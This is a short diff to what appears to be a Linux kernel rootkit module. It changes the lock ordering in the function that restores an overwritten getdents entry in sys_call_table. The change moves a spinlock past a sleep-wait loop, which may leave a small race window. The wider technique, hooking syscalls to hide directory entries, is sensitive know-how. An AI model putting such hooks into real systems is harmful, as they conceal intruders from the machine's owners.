@@ -207,10 +207,10 @@ void unhook_getdents(void) {
 	 * make sure that all processes have left our manipulated syscall. 
 	 * lock getdents_lock and keep it that way until we are done. 
 	 */
-	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
 	while(getdents_call_counter > 0) {
 		msleep(10);
 	}
+	spin_lock_irqsave(getdents_lock, getdents_lock_flags);
 
 	/* restore the old syscall */
 	sys_call_table[__NR_getdents] = (int *) original_getdents;
